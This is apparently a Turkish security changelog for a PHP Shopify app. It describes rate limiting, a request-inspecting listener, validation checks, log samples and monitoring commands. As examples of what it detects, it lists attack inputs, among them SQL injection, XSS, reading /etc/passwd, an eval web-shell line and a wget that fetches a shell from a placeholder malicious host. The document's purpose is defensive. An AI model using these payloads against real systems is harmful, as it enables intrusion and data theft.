## Güvenlik İyileştirmeleri

### Uygulanan Değişiklikler

#### 1. **SecurityRateLimiter Sınıfı** (Yeni)
- **Brute Force Koruması**: 5 başarısız deneme sonrası 15 dakika IP engelleme
- **Context-Based Limiting**: Farklı endpoint'ler için ayrı rate limit takibi
- **CloudFlare Uyumlu**: `CF-Connecting-IP` header desteği
- **Otomatik Temizlik**: Eski kayıtları otomatik siler
- **Cache Tabanlı**: File cache ile hızlı ve persistence

#### 2. **SecurityListener Event Listener** (Yeni)
Tüm HTTP isteklerini kontrol eder (priority: 256):

- **SQL Injection Tespiti**: `union select`, `' or 1=1` gibi pattern'ler
- **XSS Koruması**: `<script>` tag'leri ve JavaScript injection
- **Directory Traversal**: `../../../etc/passwd` gibi denemeler
- **Code Injection**: `eval()`, `base64_decode()`, `system()` fonksiyonları
- **Remote File Inclusion**: `wget`, `curl` komutları
- **Request Size Limiti**: 10MB üzeri istekleri reddeder
- **Suspicious User Agent**: Scanner/bot/crawler tespiti

#### 3. **Shopify Controller Güvenlik**
- ✅ HMAC doğrulaması güçlendirildi
- ✅ Shop domain format validasyonu eklendi (regex)
- ✅ Detaylı error logging
- ✅ Eksik parametre kontrolleri

#### 4. **API Endpoint Güvenlik**
- ✅ Shop domain format validasyonu
- ✅ Header-query domain mismatch kontrolü
- ✅ JSON parse error handling
- ✅ IP logging ve anomali tespiti

### Korunan Endpoint'ler

**Otomatik Rate Limit:**
- `/login` - Authentication
- `/register` - Kayıt
- `/reset-password` - Şifre sıfırlama
- `/api/login` - API login
- `/user/shopify/callback` - OAuth callback
- `/oauth/*` - Tüm OAuth işlemleri

### Tespit Edilen Saldırı Türleri

1. **SQL Injection**: `' OR 1=1--`, `UNION SELECT`
2. **XSS**: `<script>alert(1)</script>`, `javascript:`
3. **Path Traversal**: `../../../../etc/passwd`
4. **Command Injection**: `; cat /etc/passwd`
5. **Code Execution**: `eval($_POST['cmd'])`
6. **Remote File Inclusion**: `wget http://malicious.com/shell.php`

### Log Örnekleri

```bash
# Suspicious activity detected
[2024-11-03 15:30:45] app.CRITICAL: Suspicious activity detected {"ip":"192.168.1.100","uri":"/login?id=1' OR 1=1--"}

# Rate limit exceeded
[2024-11-03 15:31:20] app.WARNING: Rate limit exceeded {"ip":"192.168.1.100","context":"auth","blocked_until":"2024-11-03 15:46:20"}

# IP blocked
[2024-11-03 15:31:25] app.WARNING: IP blocked due to rate limiting {"ip":"192.168.1.100","context":"security","attempts":5}
```

### Performans Etkisi
- **SecurityListener**: ~0.5-1ms ek yük (regex kontrolü)
- **Rate Limiter**: ~0.1-0.3ms (file cache okuma)
- **Toplam Ek Yük**: <2ms (ihmal edilebilir)

### Yapılandırma

Rate limit ayarlarını değiştirmek için `SecurityRateLimiter.php`:

```php
private const MAX_ATTEMPTS = 5;          // Maksimum deneme
private const BLOCK_DURATION = 900;      // Engelleme süresi (saniye)
private const CLEANUP_PROBABILITY = 0.01; // Temizlik olasılığı
```

### Monitoring

```bash
# Engellenen IP'leri izle
tail -f var/log/prod.log | grep "Rate limit exceeded"

# Şüpheli aktiviteleri izle
tail -f var/log/prod.log | grep "Suspicious activity"

# Bloklanan IP'leri listele
tail -f var/log/prod.log | grep "IP blocked"
```

### Öneriler

1. ✅ **Şimdi Aktif**: Rate limiting, pattern detection, request validation
2. 🔄 **Gelecek**: Redis ile merkezi rate limiting (multi-server)
3. 🔄 **Gelecek**: IP whitelist/blacklist yönetimi
4. 🔄 **Gelecek**: CloudFlare firewall rules entegrasyonu
